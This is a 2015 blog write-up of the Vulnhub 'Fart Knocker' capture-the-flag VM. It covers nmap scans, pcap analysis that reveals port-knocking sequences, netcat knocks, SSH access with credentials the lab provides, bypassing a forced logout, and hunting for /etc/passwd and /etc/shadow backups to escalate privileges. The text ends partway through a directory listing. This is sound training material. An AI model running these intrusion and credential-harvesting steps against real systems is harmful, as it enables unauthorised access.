
<!DOCTYPE html>

<html lang="en">
<head>
<meta charset="utf-8"/>
<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
<meta content="True" name="HandheldFriendly"/>
<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
<meta content="" name="robots"/>
<link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&amp;family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&amp;display=swap" rel="stylesheet"/>
<link href="../../theme/stylesheet/style.min.css" rel="stylesheet" type="text/css"/>
<link href="../../theme/stylesheet/dark-theme.min.css" id="dark-theme-style" media="(prefers-color-scheme: dark)" rel="stylesheet" type="text/css"/>
<link href="../../theme/pygments/monokai.min.css" id="pygments-dark-theme" media="(prefers-color-scheme: dark)" rel="stylesheet" type="text/css"/>
<link href="../../theme/pygments/sas.min.css" id="pygments-light-theme" media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)" rel="stylesheet" type="text/css"/>
<link href="../../theme/font-awesome/css/fontawesome.css" rel="stylesheet" type="text/css"/>
<link href="../../theme/font-awesome/css/brands.css" rel="stylesheet" type="text/css"/>
<link href="../../theme/font-awesome/css/solid.css" rel="stylesheet" type="text/css"/>
<link href="https://maggick.fr/feeds/all.atom.xml" rel="alternate" title="maggick's logs Atom" type="application/atom+xml"/>
<meta content="maggick" name="author"/>
<meta content='I continued to play with the vulnhub virtual machine an started the TopHatSec - Fart Knocker. This VM is an Ubuntu 14.04 32 bits. The goal of this challenge is to break into the machine and root it. If you beat the box then please shoot me an email! Have fun guys! P.S. I got the word "Fart Knocker" from watching beavis and butthead back in the day. Otherwise you kids might not understand :)' name="description"/>
<meta content="challenge, security, boot2root, vulnhub, linux" name="keywords"/>
<meta content="maggick's logs" property="og:site_name">
<meta content="Vulnhub - Fart Knocker" property="og:title"/>
<meta content='I continued to play with the vulnhub virtual machine an started the TopHatSec - Fart Knocker. This VM is an Ubuntu 14.04 32 bits. The goal of this challenge is to break into the machine and root it. If you beat the box then please shoot me an email! Have fun guys! P.S. I got the word "Fart Knocker" from watching beavis and butthead back in the day. Otherwise you kids might not understand :)' property="og:description"/>
<meta content="en_US" property="og:locale"/>
<meta content="../../2015/06/vulnhub-fart-knocker.html" property="og:url"/>
<meta content="article" property="og:type"/>
<meta content="2015-06-16 23:30:00+02:00" property="article:published_time"/>
<meta content="" property="article:modified_time"/>
<meta content="../../author/maggick.html" property="article:author"/>
<meta content="security" property="article:section">
<meta content="challenge" property="article:tag"/>
<meta content="security" property="article:tag"/>
<meta content="boot2root" property="article:tag"/>
<meta content="vulnhub" property="article:tag"/>
<meta content="linux" property="article:tag"/>
<meta content="https://maggick.fr/media/image.png" property="og:image"/>
<title>maggick's logs – Vulnhub - Fart Knocker</title>
</meta></meta></head>
<body>
<aside>
<div>
<a href="../../">
<img alt="maggick's logs" src="https://maggick.fr/media/image.png" title="maggick's logs"/>
</a>
<h1>
<a href="../../">maggick's logs</a>
</h1>
<p>Offensive security tales</p>
<nav>
<ul class="list">
<li>
<a href="../../pages/about.html" target="_self">
                About
              </a>
</li>
<li>
<a href="../../pages/links.html" target="_self">
                Links
              </a>
</li>
<li>
<a href="../../pages/notes.html" target="_self">
                Notes
              </a>
</li>
<li>
<a href="../../pages/tools.html" target="_self">
                Tools
              </a>
</li>
</ul>
</nav>
<ul class="social">
<li>
<a class="sc-github" href="https://github.com/maggick" target="_blank">
<i class="fa-brands fa-github"></i>
</a>
</li>
<li>
<a class="sc-twitter" href="https://twitter.com/maggick_fr" target="_blank">
<i class="fa-brands fa-twitter"></i>
</a>
</li>
<li>
<a class="sc-stack-overflow" href="http://stackoverflow.com/users/1827067/maggick" target="_blank">
<i class="fa-brands fa-stack-overflow"></i>
</a>
</li>
<li>
<a class="sc-rss" href="https://maggick.fr/feeds/all.atom.xml" target="_blank">
<i class="fa-solid fa-rss"></i>
</a>
</li>
<li>
<a class="sc-discord" href="maggick" target="_blank">
<i class="fa-brands fa-discord"></i>
</a>
</li>
</ul>
</div>
</aside>
<main>
<nav>
<a href="../../">Home</a>
<a href="/archives.html">Archives</a>
<a href="/categories.html">Categories</a>
<a href="/tags.html">Tags</a>
<a href="https://maggick.fr/feeds/all.atom.xml">Atom</a>
</nav>
<article class="single">
<header>
<h1 id="vulnhub-fart-knocker">Vulnhub - Fart Knocker</h1>
<p>
      Posted on 16 Jun 2015 in <a href="../../category/security.html">security</a>

        • 6 min read
    </p>
</header>
<div>
<p><img alt="beavis and butthead" class="align-left" src="/media/2015.06/beavis_butthead.jpg" width="262"/></p>
<p>I continued to play with the vulnhub virtual machine an started the
<a href="https://www.vulnhub.com/entry/tophatsec-fartknocker,115/">TopHatSec - Fart Knocker</a>.
This VM is an Ubuntu 14.04 32 bits.</p>
<p>The goal of this challenge is to break into the machine and root it.</p>
<blockquote>
<p>If you beat the box then please shoot me an email! Have fun guys!
P.S. I got the word "Fart Knocker" from watching beavis and butthead back in the
day. Otherwise you kids might not understand :)</p>
</blockquote>
<h1>Discovery</h1>
<p>First of all we determine the VM IP address a with a simple <code>nmap -sP</code>.</p>
<h2>Nmap</h2>
<p>As always we start by <a href="http://nmap.org/">nmaping</a> the server in order to see the open ports:</p>
<div class="highlight"><pre><span></span><code><span class="p">[</span><span class="nx">maggick</span><span class="err">@</span><span class="nx">arch</span><span class="w"> </span><span class="nx">FartKnocker</span><span class="p">]</span><span class="err">$</span><span class="w"> </span><span class="nx">nmap</span><span class="w"> </span><span class="o">-</span><span class="nx">A</span><span class="w"> </span><span class="m m-Double">10.0.2.6</span>
<span class="err">#</span><span class="w"> </span><span class="nx">Nmap</span><span class="w"> </span><span class="m m-Double">6.4</span><span class="mi">7</span><span class="w"> </span><span class="nx">scan</span><span class="w"> </span><span class="nx">initiated</span><span class="w"> </span><span class="nx">Thu</span><span class="w"> </span><span class="nx">Apr</span><span class="w"> </span><span class="mi">23</span><span class="w"> </span><span class="mi">16</span><span class="p">:</span><span class="mi">21</span><span class="p">:</span><span class="mi">05</span><span class="w"> </span><span class="mi">2015</span><span class="w"> </span><span class="k">as</span><span class="p">:</span><span class="w"> </span><span class="nx">nmap</span><span class="w"> </span><span class="o">-</span><span class="nx">oA</span><span class="w"> </span><span class="nx">nmap</span><span class="w"> </span><span class="o">-</span><span class="nx">A</span><span class="w"> </span><span class="m m-Double">10.0.2.6</span>
<span class="nx">Nmap</span><span class="w"> </span><span class="nx">scan</span><span class="w"> </span><span class="nx">report</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m m-Double">10.0.2.6</span>
<span class="nx">Host</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="nx">up</span><span class="w"> </span><span class="p">(</span><span class="m m-Double">0.0</span><span class="mi">034</span><span class="nx">s</span><span class="w"> </span><span class="nx">latency</span><span class="p">).</span>
<span class="nx">Not</span><span class="w"> </span><span class="nx">shown</span><span class="p">:</span><span class="w"> </span><span class="mi">999</span><span class="w"> </span><span class="nx">closed</span><span class="w"> </span><span class="nx">ports</span>
<span class="nx">PORT</span><span class="w">   </span><span class="nx">STATE</span><span class="w"> </span><span class="nx">SERVICE</span><span class="w"> </span><span class="nx">VERSION</span>
<span class="mi">80</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">http</span><span class="w">    </span><span class="nx">Apache</span><span class="w"> </span><span class="nx">httpd</span><span class="w"> </span><span class="m m-Double">2.4.7</span><span class="w"> </span><span class="p">((</span><span class="nx">Ubuntu</span><span class="p">))</span>
<span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">title</span><span class="p">:</span><span class="w"> </span><span class="nx">Site</span><span class="w"> </span><span class="nx">doesn</span><span class="err">'</span><span class="nx">t</span><span class="w"> </span><span class="nx">have</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">title</span><span class="w"> </span><span class="p">(</span><span class="nx">text</span><span class="o">/</span><span class="nx">html</span><span class="p">).</span>

<span class="nx">Service</span><span class="w"> </span><span class="nx">detection</span><span class="w"> </span><span class="nx">performed</span><span class="p">.</span><span class="w"> </span><span class="nx">Please</span><span class="w"> </span><span class="nx">report</span><span class="w"> </span><span class="nx">any</span><span class="w"> </span><span class="nx">incorrect</span><span class="w"> </span><span class="nx">results</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="nx">http</span><span class="p">:</span><span class="c1">//nmap.org/submit/ .</span>
<span class="err">#</span><span class="w"> </span><span class="nx">Nmap</span><span class="w"> </span><span class="nx">done</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="nx">Thu</span><span class="w"> </span><span class="nx">Apr</span><span class="w"> </span><span class="mi">23</span><span class="w"> </span><span class="mi">16</span><span class="p">:</span><span class="mi">21</span><span class="p">:</span><span class="mi">12</span><span class="w"> </span><span class="mi">2015</span><span class="w"> </span><span class="o">--</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="nx">IP</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="w"> </span><span class="nx">host</span><span class="w"> </span><span class="nx">up</span><span class="p">)</span><span class="w"> </span><span class="nx">scanned</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m m-Double">6.9</span><span class="mi">8</span><span class="w"> </span><span class="nx">seconds</span>
</code></pre></div>
<p>Only the port 80 is open with an HTTP server.</p>
<p>As always I had launch a <a href="https://cirt.net/nikto2">nikto</a> against the server
but no interesting result.</p>
<h1>Exploitation</h1>
<p>We go to the web page and only found a pcap file which is a capture of some
network traffic.</p>
<h2>pcap1</h2>
<p>We analyse the <code>pcap1.pcap</code> file. The packets and the VM name leads us to ports
knocking. As I do not know anything about it I have done some research on internet to
understand the principle (which is quite simple: send packets to a ports sequence
will open an other port) and fund a
<a href="https://en.wikipedia.org/wiki/Port_knocking">basic script to knock</a>.
I adapt it to my need and launch it against the target. The script will knock on
the sequence ports extract from the pcap file (it is quite simple to read with
<a href="https://www.wireshark.org/">wireshark</a>):</p>
<div class="highlight"><pre><span></span><code><span class="o">[</span><span class="n">maggick@arch FartKnocker</span><span class="o">]</span><span class="err">$</span><span class="w"> </span><span class="n">sudo</span><span class="w"> </span><span class="n">python2</span><span class="w"> </span><span class="n">script</span><span class="p">.</span><span class="n">py</span>
<span class="nl">WARNING</span><span class="p">:</span><span class="w"> </span><span class="k">No</span><span class="w"> </span><span class="n">route</span><span class="w"> </span><span class="k">found</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">IPv6</span><span class="w"> </span><span class="n">destination</span><span class="w"> </span><span class="o">::</span><span class="w"> </span><span class="p">(</span><span class="k">no</span><span class="w"> </span><span class="k">default</span><span class="w"> </span><span class="n">route</span><span class="vm">?</span><span class="p">)</span>
<span class="o">[</span><span class="n">*</span><span class="o">]</span><span class="w"> </span><span class="n">Knocking</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="mf">10.0.2.6</span><span class="err">:</span><span class="mi">7000</span>
<span class="o">[</span><span class="n">*</span><span class="o">]</span><span class="w"> </span><span class="n">Knocking</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="mf">10.0.2.6</span><span class="err">:</span><span class="mi">8000</span>
<span class="o">[</span><span class="n">*</span><span class="o">]</span><span class="w"> </span><span class="n">Knocking</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="mf">10.0.2.6</span><span class="err">:</span><span class="mi">9000</span>
<span class="o">[</span><span class="n">*</span><span class="o">]</span><span class="w"> </span><span class="n">Knocking</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="mf">10.0.2.6</span><span class="err">:</span><span class="mi">7000</span>
<span class="o">[</span><span class="n">*</span><span class="o">]</span><span class="w"> </span><span class="n">Knocking</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="mf">10.0.2.6</span><span class="err">:</span><span class="mi">8000</span>
<span class="o">[</span><span class="n">*</span><span class="o">]</span><span class="w"> </span><span class="n">Knocking</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="mf">10.0.2.6</span><span class="err">:</span><span class="mi">9000</span>
<span class="o">[</span><span class="n">*</span><span class="o">]</span><span class="w"> </span><span class="n">Knocking</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="mf">10.0.2.6</span><span class="err">:</span><span class="mi">8888</span>
<span class="o">[</span><span class="n">*</span><span class="o">]</span><span class="w"> </span><span class="n">Scanning</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="k">open</span><span class="w"> </span><span class="n">ports</span><span class="w"> </span><span class="k">using</span><span class="w"> </span><span class="n">nmap</span>
</code></pre></div>
<p>A <a href="http://nmap.org/">nmap</a> scan is launched after the knocking sequence to see
what port will open:</p>
<div class="highlight"><pre><span></span><code><span class="nx">Starting</span><span class="w"> </span><span class="nx">Nmap</span><span class="w"> </span><span class="m m-Double">6.4</span><span class="mi">7</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="nx">http</span><span class="p">:</span><span class="c1">//nmap.org ) at 2015-04-27 16:35 CEST</span>
<span class="nx">Nmap</span><span class="w"> </span><span class="nx">scan</span><span class="w"> </span><span class="nx">report</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m m-Double">10.0.2.6</span>
<span class="nx">Host</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="nx">up</span><span class="w"> </span><span class="p">(</span><span class="m m-Double">0.0</span><span class="mi">0060</span><span class="nx">s</span><span class="w"> </span><span class="nx">latency</span><span class="p">).</span>
<span class="nx">Not</span><span class="w"> </span><span class="nx">shown</span><span class="p">:</span><span class="w"> </span><span class="mi">998</span><span class="w"> </span><span class="nx">closed</span><span class="w"> </span><span class="nx">ports</span>
<span class="nx">PORT</span><span class="w">     </span><span class="nx">STATE</span><span class="w"> </span><span class="nx">SERVICE</span><span class="w">         </span><span class="nx">VERSION</span>
<span class="mi">80</span><span class="o">/</span><span class="nx">tcp</span><span class="w">   </span><span class="nx">open</span><span class="w">  </span><span class="nx">http</span><span class="w">            </span><span class="nx">Apache</span><span class="w"> </span><span class="nx">httpd</span><span class="w"> </span><span class="m m-Double">2.4.7</span><span class="w"> </span><span class="p">((</span><span class="nx">Ubuntu</span><span class="p">))</span>
<span class="mi">8888</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">sun</span><span class="o">-</span><span class="nx">answerbook</span><span class="p">?</span>

<span class="nx">Service</span><span class="w"> </span><span class="nx">detection</span><span class="w"> </span><span class="nx">performed</span><span class="p">.</span><span class="w"> </span><span class="nx">Please</span><span class="w"> </span><span class="nx">report</span><span class="w"> </span><span class="nx">any</span><span class="w"> </span><span class="nx">incorrect</span><span class="w"> </span><span class="nx">results</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="nx">http</span><span class="p">:</span><span class="c1">//nmap.org/submit/ .</span>
<span class="nx">Nmap</span><span class="w"> </span><span class="nx">done</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="nx">IP</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="w"> </span><span class="nx">host</span><span class="w"> </span><span class="nx">up</span><span class="p">)</span><span class="w"> </span><span class="nx">scanned</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m m-Double">6.4</span><span class="mi">3</span><span class="w"> </span><span class="nx">seconds</span>
</code></pre></div>
<p>This port run an other HTTP service which give us a second url <code>/burgerworld</code>
and a second pcap file.</p>
<h2>pcap2</h2>
<p>After trying a bit to replay and understand the file I used the follow  TCP
stream function from <a href="https://www.wireshark.org">wireshark</a>, and the following
appears:</p>
<p><img alt="eins drei drei sieben" src="/media/2015.06/beavis.jpg"/></p>
<p><strong>eins drei drei sieben</strong> means one, three, three, seven (7 years of German at least
useful, well it was of some use during the NDH qualifications too).</p>
<p>Once again we knock on port 1, 3, 3 and 7, the port 1337 open and show us an
other URL: <code>/iamcornholio/</code>. We got some code looking like base64.</p>
<h2>base64</h2>
<p>The code is:  T3BlbiB1cCBTU0g6IDg4ODggOTk5OSA3Nzc3IDY2NjYK which is (after
base64 decode) "Open up SSH: 8888 9999 7777 6666". Once more, port knocking on
port 8888, 9999, 7777 and 6666. This time I simply use netcat to knock:</p>
<div class="highlight"><pre><span></span><code>nc 10.0.2.6 8888
nc 10.0.2.6 9999
nc 10.0.2.6 7777
nc 10.0.2.6 6666
</code></pre></div>
<p>Once more we launch nmap to see if a port was opened:</p>
<div class="highlight"><pre><span></span><code><span class="p">[</span><span class="nx">maggick</span><span class="err">@</span><span class="nx">arch</span><span class="w"> </span><span class="nx">FartKnocker</span><span class="p">]</span><span class="err">$</span><span class="w"> </span><span class="nx">nmap</span><span class="w">  </span><span class="o">-</span><span class="nx">A</span><span class="w"> </span><span class="m m-Double">10.0.2.6</span>

<span class="nx">Starting</span><span class="w"> </span><span class="nx">Nmap</span><span class="w"> </span><span class="m m-Double">6.4</span><span class="mi">7</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="nx">http</span><span class="p">:</span><span class="c1">//nmap.org ) at 2015-04-28 13:32 CEST</span>
<span class="nx">Nmap</span><span class="w"> </span><span class="nx">scan</span><span class="w"> </span><span class="nx">report</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m m-Double">10.0.2.6</span>
<span class="nx">Host</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="nx">up</span><span class="w"> </span><span class="p">(</span><span class="m m-Double">0.0</span><span class="mi">013</span><span class="nx">s</span><span class="w"> </span><span class="nx">latency</span><span class="p">).</span>
<span class="nx">Not</span><span class="w"> </span><span class="nx">shown</span><span class="p">:</span><span class="w"> </span><span class="mi">998</span><span class="w"> </span><span class="nx">closed</span><span class="w"> </span><span class="nx">ports</span>
<span class="nx">PORT</span><span class="w">   </span><span class="nx">STATE</span><span class="w"> </span><span class="nx">SERVICE</span><span class="w"> </span><span class="nx">VERSION</span>
<span class="mi">22</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">ssh</span><span class="w">     </span><span class="p">(</span><span class="nx">protocol</span><span class="w"> </span><span class="m m-Double">2.0</span><span class="p">)</span>
<span class="o">|</span><span class="w"> </span><span class="nx">ssh</span><span class="o">-</span><span class="nx">hostkey</span><span class="p">:</span>
<span class="o">|</span><span class="w">   </span><span class="mi">1024</span><span class="w"> </span><span class="mi">8</span><span class="nx">d</span><span class="p">:</span><span class="mi">1</span><span class="nx">f</span><span class="p">:</span><span class="mi">97</span><span class="p">:</span><span class="nx">c6</span><span class="p">:</span><span class="mi">4</span><span class="nx">d</span><span class="p">:</span><span class="nx">e9</span><span class="p">:</span><span class="mi">1</span><span class="nx">d</span><span class="p">:</span><span class="mi">2</span><span class="nx">b</span><span class="p">:</span><span class="mi">5</span><span class="nx">d</span><span class="p">:</span><span class="nx">b8</span><span class="p">:</span><span class="mi">6</span><span class="nx">e</span><span class="p">:</span><span class="mi">64</span><span class="p">:</span><span class="mi">66</span><span class="p">:</span><span class="nx">bb</span><span class="p">:</span><span class="mi">48</span><span class="p">:</span><span class="mi">2</span><span class="nx">b</span><span class="w"> </span><span class="p">(</span><span class="nx">DSA</span><span class="p">)</span>
<span class="o">|</span><span class="w">   </span><span class="mi">2048</span><span class="w"> </span><span class="mi">02</span><span class="p">:</span><span class="mi">31</span><span class="p">:</span><span class="mi">1</span><span class="nx">c</span><span class="p">:</span><span class="mi">77</span><span class="p">:</span><span class="nx">aa</span><span class="p">:</span><span class="nx">c1</span><span class="p">:</span><span class="nx">f6</span><span class="p">:</span><span class="mi">2</span><span class="nx">b</span><span class="p">:</span><span class="nx">d3</span><span class="p">:</span><span class="mi">09</span><span class="p">:</span><span class="nx">f6</span><span class="p">:</span><span class="nx">e0</span><span class="p">:</span><span class="mi">63</span><span class="p">:</span><span class="nx">fe</span><span class="p">:</span><span class="nx">a9</span><span class="p">:</span><span class="mi">37</span><span class="w"> </span><span class="p">(</span><span class="nx">RSA</span><span class="p">)</span>
<span class="o">|</span><span class="nx">_</span><span class="w">  </span><span class="mi">256</span><span class="w"> </span><span class="nx">fe</span><span class="p">:</span><span class="mi">16</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="nx">a4</span><span class="p">:</span><span class="mi">4</span><span class="nx">d</span><span class="p">:</span><span class="mi">7</span><span class="nx">f</span><span class="p">:</span><span class="mi">3</span><span class="nx">d</span><span class="p">:</span><span class="nx">db</span><span class="p">:</span><span class="nx">b6</span><span class="p">:</span><span class="mi">11</span><span class="p">:</span><span class="nx">d4</span><span class="p">:</span><span class="nx">b8</span><span class="p">:</span><span class="nx">c1</span><span class="p">:</span><span class="mi">32</span><span class="p">:</span><span class="nx">b6</span><span class="p">:</span><span class="mi">79</span><span class="w"> </span><span class="p">(</span><span class="nx">ECDSA</span><span class="p">)</span>
<span class="mi">80</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">http</span><span class="w">    </span><span class="nx">Apache</span><span class="w"> </span><span class="nx">httpd</span><span class="w"> </span><span class="m m-Double">2.4.7</span><span class="w"> </span><span class="p">((</span><span class="nx">Ubuntu</span><span class="p">))</span>
<span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">title</span><span class="p">:</span><span class="w"> </span><span class="nx">Site</span><span class="w"> </span><span class="nx">doesn</span><span class="err">'</span><span class="nx">t</span><span class="w"> </span><span class="nx">have</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">title</span><span class="w"> </span><span class="p">(</span><span class="nx">text</span><span class="o">/</span><span class="nx">html</span><span class="p">).</span>

<span class="nx">Service</span><span class="w"> </span><span class="nx">detection</span><span class="w"> </span><span class="nx">performed</span><span class="p">.</span><span class="w"> </span><span class="nx">Please</span><span class="w"> </span><span class="nx">report</span><span class="w"> </span><span class="nx">any</span><span class="w"> </span><span class="nx">incorrect</span><span class="w"> </span><span class="nx">results</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="nx">http</span><span class="p">:</span><span class="c1">//nmap.org/submit/ .</span>
<span class="nx">Nmap</span><span class="w"> </span><span class="nx">done</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="nx">IP</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="w"> </span><span class="nx">host</span><span class="w"> </span><span class="nx">up</span><span class="p">)</span><span class="w"> </span><span class="nx">scanned</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m m-Double">6.3</span><span class="mi">8</span><span class="w"> </span><span class="nx">seconds</span>
</code></pre></div>
<p>Well, the ssh port 22 is now open.</p>
<h2>SSH</h2>
<p>We try to connect to it:</p>
<div class="highlight"><pre><span></span><code>[maggick@arch FartKnocker]$ ssh 10.0.2.6
The authenticity of host '10.0.2.6 (10.0.2.6)' can't be established.
ECDSA key fingerprint is SHA256:uSdkKIWXcJl0j0P5Y+cAzjD9CJOFQ/NxtG8kz8ptzFE.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.0.2.6' (ECDSA) to the list of known hosts.
############################################
# CONGRATS! YOU HAVE OPENED THE SSH SERVER #
# USERNAME: butthead                       #
# PASSWORD: nachosrule                     #
############################################
</code></pre></div>
<p>The password and username are given by the ssh message, we should use them
directly:</p>
<div class="highlight"><pre><span></span><code>[maggick@arch FartKnocker]$ ssh 10.0.2.6 -lbutthead
############################################
# CONGRATS! YOU HAVE OPENED THE SSH SERVER #
# USERNAME: butthead                       #
# PASSWORD: nachosrule                     #
############################################
butthead@10.0.2.6's password:
Welcome to Ubuntu 14.04.2 LTS (GNU/Linux 3.13.0-46-generic i686)

 * Documentation:  https://help.ubuntu.com/
Last login: Tue Mar  3 01:02:49 2015 from 192.168.56.102
You are only logging in for a split second! What do you do!
</code></pre></div>
<p>We got an ssh connection but we are logout immediately.</p>
<p><em>I will no more put the CONGRATS message for your own sanity.</em></p>
<p>We execute a command directly within the ssh command (a classic ssh feature):</p>
<div class="highlight"><pre><span></span><code>[maggick@arch FartKnocker]$ ssh 10.0.2.6 -lbutthead ls
nachos
</code></pre></div>
<p>The commands is executed, my first reaction was to read <code>/etc/passwd/</code> as the
flag was there in
<a href="https://maggick.fr/2015/04/vulnhub-freshly.html">the last TopHatSec challenge</a>
but this is not so simple this time. Nevertheless we can get a shell buy using
<code>/bin/bash/</code>. We read the <code>nachos</code> file in buttheads's home:</p>
<div class="highlight"><pre><span></span><code>cat nachos
Great job on getting this far.

Can you login as beavis or root ?
</code></pre></div>
<p>The next step seems to get a beavis or root shell from the butthead one. This a
privilege escalation.</p>
<h2>Guessing</h2>
<p><strong>Disclaimer:</strong> during my long guessing period for privilege escalation I looked at
the other writeup to see if I missed something but they all used password
bruteforce. I do not like bruteforce, so I continue looking for something else.</p>
<p>This part was the hardest of this challenge. It take me three weeks (not at full
time of course) to get over with it. I will give you some of my guessing steps:</p>
<p>First of all to get a shell we just need to modify the <code>.profil</code> file:</p>
<div class="highlight"><pre><span></span><code><span class="nv">sed</span><span class="w"> </span><span class="s1">'s/exit//'</span><span class="w"> </span><span class="o">-</span><span class="nv">i</span><span class="w"> </span>.<span class="nv">profile</span>
</code></pre></div>
<p>Let see what there is in beavis' home:</p>
<div class="highlight"><pre><span></span><code>ls /home/beavis
html
nc1.sh
ncone
nctwo
</code></pre></div>
<p>There was a lot of netcat scripts but none of them allow us to make our privilege
escalation.</p>
<p>Looking for a solution to get login as beavis, we notice that there was more
pcap files at our disposal :</p>
<div class="highlight"><pre><span></span><code>ls /var/www/html -R
/var/www/html:
burgerworld
iamcornholio
index.html
pcap1.pcap
spanishfly

/var/www/html/burgerworld:
index.html
pcap2.pcap

/var/www/html/iamcornholio:
index.html
pcap3.pcap

/var/www/html/spanishfly:
pcap4.pcap
</code></pre></div>
<p>Even more troll: there is a folder <code>/var/backups/</code> containing backups from the
<code>/etc/shadow</code> file (which could be useful to crack the password):</p>
<div class="highlight"><pre><span></span><code><span class="n">butthead</span><span class="err">@</span><span class="n">Huhuhhhhhuhuhhh</span><span class="p">:</span><span class="o">~$</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="o">-</span><span class="n">la</span><span class="w"> </span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">backups</span><span class="o">/</span>
<span class="n">total</span><span class="w"> </span><span class="mi">4872</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w">  </span><span class="mi">2</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w">      </span><span class="mi">4096</span><span class="w"> </span><span class="n">Apr</span><span class="w"> </span><span class="mi">28</span><span class="w"> </span><span class="mi">06</span><span class="p">:</span><span class="mi">25</span><span class="w"> </span><span class="o">.</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="mi">12</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w">      </span><span class="mi">4096</span><span class="w"> </span><span class="n">Mar</span><span class="w">  </span><span class="mi">2</span><span class="w"> </span><span class="mi">17</span><span class="p">:</span><span class="mi">45</span><span class="w"> </span><span class="o">..</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="w">  </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w">      </span><span class="mi">7380</span><span class="w"> </span><span class="n">Mar</span><span class="w">  </span><span class="mi">2</span><span class="w"> </span><span class="mi">23</span><span class="p">:</span><span class="mi">39</span><span class="w"> </span><span class="n">apt</span><span class="o">.</span><span class="n">extended_states</span><span class="o">.</span><span class="mi">0</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="w">  </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w">   </span><span class="mi">4516724</span><span class="w"> </span><span class="n">Mar</span><span class="w">  </span><span class="mi">2</span><span class="w"> </span><span class="mi">16</span><span class="p">:</span><span class="mi">45</span><span class="w"> </span><span class="n">aptitude</span><span class="o">.</span><span class="n">pkgstates</span><span class="o">.</span><span class="mi">0</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="w">  </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w">    </span><span class="mi">437586</span><span class="w"> </span><span class="n">Mar</span><span class="w">  </span><span class="mi">2</span><span class="w"> </span><span class="mi">23</span><span class="p">:</span><span class="mi">39</span><span class="w"> </span><span class="n">dpkg</span><span class="o">.</span><span class="n">status</span><span class="o">.</span><span class="mi">0</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-------</span><span class="w">  </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w">       </span><span class="mi">690</span><span class="w"> </span><span class="n">Mar</span><span class="w">  </span><span class="mi">3</span><span class="w"> </span><span class="mi">00</span><span class="p">:</span><span class="mi">30</span><span class="w"> </span><span class="n">group</span><span class="o">.</span><span class="n">bak</span>
